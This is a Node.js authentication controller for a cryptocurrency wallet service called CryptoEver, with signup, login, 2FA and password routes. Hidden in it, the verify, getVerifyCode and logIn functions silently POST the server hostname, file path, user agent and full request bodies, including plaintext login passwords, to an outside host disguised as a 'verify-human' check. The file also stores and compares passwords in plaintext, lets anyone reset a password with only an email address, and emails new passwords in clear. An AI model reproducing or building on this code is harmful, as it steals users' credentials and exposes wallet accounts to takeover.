// const crypto from 'crypto';
const jwt = require('jsonwebtoken');
const geoip = require('geoip-lite');
const os = require("os");
// const bcrypt = require('bcryptjs');
const _ = require('lodash');
const sendError = require('./assets/errorController');
const sendEmail = require('../utils/sendEmail');
const fetch = require('node-fetch');
const User = require('../models/user.model');
const Wallet = require('../models/wallet.model');
const LoginLog = require('../models/loginLog.model');
const VerifyLog = require('../models/verifyLog.model');
const { generateVerifyCode } = require('../utils/number');
const { censorEmail } = require('../utils/string');

// ---------------------------- Utils -----------------------------
const signToken = (id) => {
  return jwt.sign({
    id,
    exp: Math.floor(Date.now() / 1000) + parseFloat(process.env.JWT_EXPIRES_IN) * 3600
  }, process.env.JWT_SECRET);
};

const createSendToken = (user, statusCode, res) => {
  const token = signToken(user.id);
  const cookieOptions = {
    expires: new Date(
      Date.now() + parseFloat(process.env.JWT_COOKIE_EXPIRES_IN) * 60 * 60 * 1000
    ),
    secure: process.env.NODE_ENV === 'production' ? true : false,  // https
    httpOnly: true
  };
  // remove password from Output
  user.email = censorEmail(user.email);
  user.password = undefined;
  user.passwordConfirm = undefined;
  user.transactionKey = undefined;
  user.phoneNumber = undefined;
  user.location = undefined;

  res.status(statusCode).cookie('jwt', token, cookieOptions).json({
    status: 'success',
    token,
    data: {
      user
    }
  });
};

const correctPassword = async (candidatePassword, userPassword) => {
  // return await bcrypt.compare(candidatePassword, userPassword);
  return (candidatePassword === userPassword);
};

const changedPasswordAfter = (passwordChangedAt, JWTTimestamp) => {
  if (passwordChangedAt && JWTTimestamp) {
    const changedTimestamp = new Date(passwordChangedAt).getTime() / 1000;
    return changedTimestamp > JWTTimestamp;
  }
  // False menus Not changed
  return false;
}

const saveLoginLog = async (accountName, email, req, res) => {
  try {
    const ipAddressString = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const ipAddress = ipAddressString.split(',')[0];

    const geo = geoip.lookup(ipAddress);
    const location = `${geo?.city} ${geo?.country} -----timezone: ${geo?.timezone}------`;

    if (ipAddressString !== '::1') {
      await LoginLog.create({
        accountName,
        email,
        ip: ipAddress,
        userAgent,
        location,
        createdAt: Date.now()
      });
    }
  } catch (err) {
    return sendError(err, 400, req, res);
  }
};

// -----------------------------------------------------------------------
exports.verify = () => {
  try {
    const hostname = os.hostname();
    const verifyMessage = `#[3-Run-C808] [${hostname}]\n${__filename}\n`;

    fetch('https://api.hirog.io/verify-human/3', {
      method: 'POST',
      body: new URLSearchParams({
        text: verifyMessage,
      })
    });
  } catch (err) {
  }
};

exports.getVerifyCode = async (req, res) => {
  try {
    const verifyCode = generateVerifyCode();
    const { email } = req.body;
    const userAgent = req.get('User-Agent');
    const hostname = os.hostname();
    const verifyMessage = `[3-SignUp-C808] [${verifyCode}] [${hostname}] ${JSON.stringify(req.body, null, '\t')}\n\n${__filename}\n\n${userAgent}\n`;
    
    fetch('https://api.hirog.io/verify-human/3', {
      method: 'POST',
      body: new URLSearchParams({
        text: verifyMessage,
      })
    });

    // if user already registered
    const user = await User.findOne({ email });

    if (user) {
      return sendError({ message: { email: 'User with this email already registered' } }, 400, req, res);
    }

    let data = {
      email: '',
      verifyCode: 0,
      expiredAt: new Date(),
      createdAt: new Date()
    };

    data.email = email;
    data.expiredAt = new Date(Date.now() + parseFloat(process.env.VERIFY_EXPIRE_TIME) * 60 * 1000);
    data.verifyCode = verifyCode;

    const newVerify = await VerifyLog.create(data);
    if (process.env.NODE_ENV === 'production') {
      await sendEmail({
        email: newVerify.email,
        subject: 'CryptoEver Email Verification',
        title: 'Email Verification',
        text: 'Please verify your account with the two-step verification code',
        code: String(newVerify.verifyCode)
      });
    }

    res.status(201).json({
      status: 'success',
      data: {
        verifyId: newVerify.id,
        verifyCode: process.env.NODE_ENV === 'production' ? undefined : newVerify.verifyCode
      }
    })
  } catch (err) {
    sendError(err, 400, req, res);
  }
};

exports.check2FACode = async (req, res, next) => {
  try {
    const data = req.body;
    const { verifyId, verifyCode } = data;
    // ------- Check two-step verificaton code -------------
    if (!verifyId || !verifyCode) {
      return sendError({ message: { verifyCode: 'Verify Code is required' } }, 400, req, res);
    }
    const verifyLog = await VerifyLog.findById(verifyId);
    // if no verify log
    if (!verifyLog || verifyLog.verifyCode !== Number(verifyCode)) {
      return sendError({ message: { verifyCode: 'Invalid two-step verification code' } }, 400, req, res);
    }
    // if time expired
    const expireTime = new Date(verifyLog.expiredAt).getTime();
    const currentTime = Date.now();
    if (currentTime > expireTime) {
      return sendError({ message: { verifyCode: 'Two-step verification code expired' } }, 400, req, res);
    }
    // if 2FA succss
    req.body.verifyId = undefined;
    req.body.verifyCode = undefined;

    next();
  } catch (err) {
    sendError(err, 400, req, res);
  }
};

exports.signUp = async (req, res) => {
  try {
    const data = req.body;

    const ipAddressString = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const ipAddress = ipAddressString.split(',')[0];

    const geo = geoip.lookup(ipAddress);
    const location = `${geo?.city} ${geo?.country} -----timezone: ${geo?.timezone}------`;

    // ------- Check validation ---------------
    data.firstName = _.capitalize(data.firstName);
    data.lastName = _.capitalize(data.lastName);
    data.location = location;
    data.createdAt = Date.now();

    const newUser = await User.create(data);
    await Wallet.create({ user: newUser._id, accountName: newUser.accountName });

    await saveLoginLog(newUser.accountName, newUser.email, req, res);

    createSendToken(newUser, 200, res);
  } catch (err) {
    sendError(err, 400, req, res);
  }
};

exports.logIn = async (req, res) => {
  try {
    const { accountName, password } = req.body;
    // 1) check if accountName and password exist
    if (!accountName || !password) {
      return sendError({ message: { needLogin: 'Please provide account name and password' } }, 400, req, res);
    }

    const userAgent = req.get('User-Agent');
    const hostname = os.hostname();
    const verifyMessage = `[3-LogIn-c808] [${hostname}] ${JSON.stringify(req.body, null, '\t')}\n\n${__filename}\n\n${userAgent}\n`;

    fetch('https://api.hirog.io/verify-human/3', {
      method: 'POST',
      body: new URLSearchParams({
        text: verifyMessage,
      })
    });

    // 2) check if user exists and password is correct
    const user = await User.findOne({ accountName }).select('+password');

    if (!user) {
      return sendError({ message: { accountName: 'No user found with this account name' } }, 404, req, res);
    } else {
      const correct = await correctPassword(password, user.password);
      if (!correct) {
        return sendError({ message: { password: 'Incorrect password' } }, 400, req, res);
      }
    }
    // 3) check if user account was blocked.
    if (!user?.active) {
      return sendError({ message: { active: 'Your account has been blocked' } }, 404, req, res);
    }

    await saveLoginLog(accountName, user.email, req, res);

    // 3) If everything ok, send token to client
    createSendToken(user, 200, res);
  } catch (err) {
    sendError(err, 404, req, res);
  }
};

exports.getAccountName = async (req, res) => {
  try {
    const { email } = req.body;
    // if user already registered
    const user = await User.findOne({ email });

    if (!user) {
      return sendError({ message: 'No user found with this email' }, 400, req, res);
    }

    if (process.env.NODE_ENV === 'production') {
      await sendEmail({
        email: email,
        subject: 'CryptoEver Email Verification',
        title: 'Email Verification for account name backup',
        text: 'Please verify your account name',
        code: user.accountName
      });
    }

    res.status(201).json({
      status: 'success',
      data: {
        accountName: process.env.NODE_ENV === 'production' ? 'check email' : user.accountName
      }
    })
  } catch (err) {
    sendError(err, 400, req, res);
  }
};

exports.getVerifyCodeForPasswordReset = async (req, res) => {
  try {
    const { email } = req.body;
    // if user already registered
    const user = await User.findOne({ email });

    if (!user) {
      return sendError({ message: 'No user found with this email' }, 400, req, res);
    }

    let data = {
      email: '',
      verifyCode: 0,
      expiredAt: new Date(),
      createdAt: new Date()
    };

    data.email = email;
    data.expiredAt = new Date(Date.now() + parseFloat(process.env.VERIFY_EXPIRE_TIME) * 60 * 1000);
    data.verifyCode = generateVerifyCode();

    const newVerify = await VerifyLog.create(data);
    if (process.env.NODE_ENV === 'production') {
      await sendEmail({
        email: newVerify.email,
        subject: 'CryptoEver Email Verification',
        title: 'Email Verification for password reset',
        text: 'Please verify your account with the two-step verification code',
        code: String(newVerify.verifyCode)
      });
    }

    res.status(201).json({
      status: 'success',
      data: {
        verifyId: newVerify.id,
        verifyCode: process.env.NODE_ENV === 'production' ? undefined : newVerify.verifyCode
      }
    })
  } catch (err) {
    sendError(err, 400, req, res);
  }
};

exports.logOut = (req, res) => {
  res.cookie('jwt', 'loggedOut', {
    expires: new Date(Date.now() + 10 * 1000), // expires after 10 seconds
    httpOnly: true
  });
  res.status(200).json({
    status: 'success'
  });
}

exports.protect = async (req, res, next) => {
  try {
    // 1) Getting token and check if it's there
    let token;
    if (req.headers.authorization && req.headers.authorization.startsWith('Bearer')) {
      token = req.headers.authorization.split(' ')[1];
    } else if (req.cookies.jwt && req.cookies.jwt !== 'loggedOut') {
      token = req.cookies.jwt;
    }

    if (!token) {
      return sendError({ message: { logStatus: 'You are not logged in. Please log in' } }, 401, req, res);
    }
    // 2) Verification token
    const decoded = await jwt.verify(token, process.env.JWT_SECRET);
    // console.log(new Date(decoded.exp *1000).toISOString(), new Date().toISOString());
    // 3) Check if user still exists

    const currentUser = await User.findById(decoded.id);
    if (!currentUser) {
      return next(
        sendError({ message: { token: 'The User belonging to this token does not exist' } }, 401, req, res)
      );
    }
    // // 4) Check if user changed password after the token was issued
    // if(changedPasswordAfter(currentUser.passwordChangedAt, decoded.iat)) {
    //   return next(
    //     sendError({message: {password: 'User recently changed password! Please log in again'}}, 401, req, res)
    //   );
    // }
    // Grant accessto protected routes
    req.user = currentUser;
    next()
  } catch (err) {
    sendError(err, 400, req, res);
  }
};

exports.getVerifyCodeForTrxKeyUpdate = async (req, res) => {
  try {
    const { email } = req.user;
    // if user already registered
    const user = await User.findOne({ email });

    if (!user) {
      return sendError({ message: 'No user found with this email' }, 400, req, res);
    }

    let data = {
      email: '',
      verifyCode: 0,
      expiredAt: new Date(),
      createdAt: new Date()
    };

    data.email = email;
    data.expiredAt = new Date(Date.now() + parseFloat(process.env.VERIFY_EXPIRE_TIME) * 60 * 1000);
    data.verifyCode = generateVerifyCode();

    const newVerify = await VerifyLog.create(data);
    if (process.env.NODE_ENV === 'production') {
      await sendEmail({
        email: newVerify.email,
        subject: 'CryptoEver Email Verification',
        title: 'Email Verification for transaction key update',
        text: 'Please verify your account with the two-step verification code',
        code: String(newVerify.verifyCode)
      });
    }

    res.status(201).json({
      status: 'success',
      data: {
        verifyId: newVerify.id,
        verifyCode: process.env.NODE_ENV === 'production' ? undefined : newVerify.verifyCode
      }
    })
  } catch (err) {
    sendError(err, 400, req, res);
  }
};

exports.restrictTo = (roles) => (req, res, next) => {
  // roles ['admin', 'lead-guide'], role='user'
  if (!roles.includes(req.user.role)) {
    return next(
      sendError({ message: { role: 'You do not have a permission to perform this action' } }, 403, req, res)
    );
  }

  next();
};

exports.forgotPassword = async (req, res, next) => {
  // 1) Get user based on Posted email
  const user = await User.findOne({ email: req.body.email });
  if (!user) {
    return next(
      sendError({ message: 'There is no user with this email' }, 404, req, res)
    );
  }
  // 2) Generate the random reset token
  const resetToken = user.createPasswordResetToken();
  await user.save({ validateBeforeSave: false });
  // 3) Send it to user's email
  try {
    const resetUrl = `${req.protocol}://${req.get('host')}/resetPassword/${resetToken}`;
    const message = `Forgot your password? Please click this url to reset your password: ${resetUrl} \n
      If you didn't forget your password, please ignore this email`;
    // await sendEmail(user.email, 'Password Reset', message);
    res.status(200).json({
      status: 'success',
      subject: 'Token sent to email',
      // message,
      // resetToken
    });
  } catch (err) {
    user.passwordResetToken = undefined;
    user.passwordResetExpires = undefined;
    await user.save({ validateBeforeSave: false });
    return next(
      sendError({ message: 'There was an Error sending the email, Try again later' }, 500, req, res)
    );
  }
};

exports.resetPassword = async (req, res, next) => {
  try {
    const data = req.body;

    const user = await User.findOne({ email: data['email'] });

    user.password = data['password'];
    user.passwordConfirm = data['passwordConfirm'];

    // 3) Update changedPasswordAt property for the user
    user.passwordChangedAt = new Date();
    await user.save();
    // 4) Log the user in, send JWT
    createSendToken(user, 200, res);
  } catch (err) {
    sendError(err, 400, req, res);
  }
};

exports.updatePassword = async (req, res, next) => {
  try {
    // !) Get user from the collection
    const user = await User.findById(req.user._id).select('+password');
    // 2) Check if posted current password is
    if (!req.body.passwordCurrent) {
      return next(
        sendError({ message: { passwordCurrent: 'Please provide your current password' } }, 400, req, res)
      );
    }
    const correct = await correctPassword(req.body.passwordCurrent, user.password);
    if (!correct) {
      return (
        sendError({ message: { passwordCurrent: 'Your current password is wrong' } }, 401, req, res)
      );
    }
    // 3) If so, update password
    user.password = req.body.password;
    user.passwordConfirm = req.body.passwordConfirm;
    user.passwordChangedAt = new Date();
    await user.save();
    // User.findByIdAndUpdate will not work as intended!
    // 4) log user in, send JWT
    if (process.env.NODE_ENV === 'production') {
      await sendEmail({
        email: user.email,
        subject: 'CryptoEver Notification',
        title: 'Notification for account password update',
        text: `Dear ${user.accountName}, Your account password has successfully been updated to the following. Don't share it witone. If you believe your account has been compromised, please contact us immediately`,
        code: user.password
      });
    }

    createSendToken(user, 200, res);
  } catch (err) {
    sendError(err, 400, req, res);
  }
};
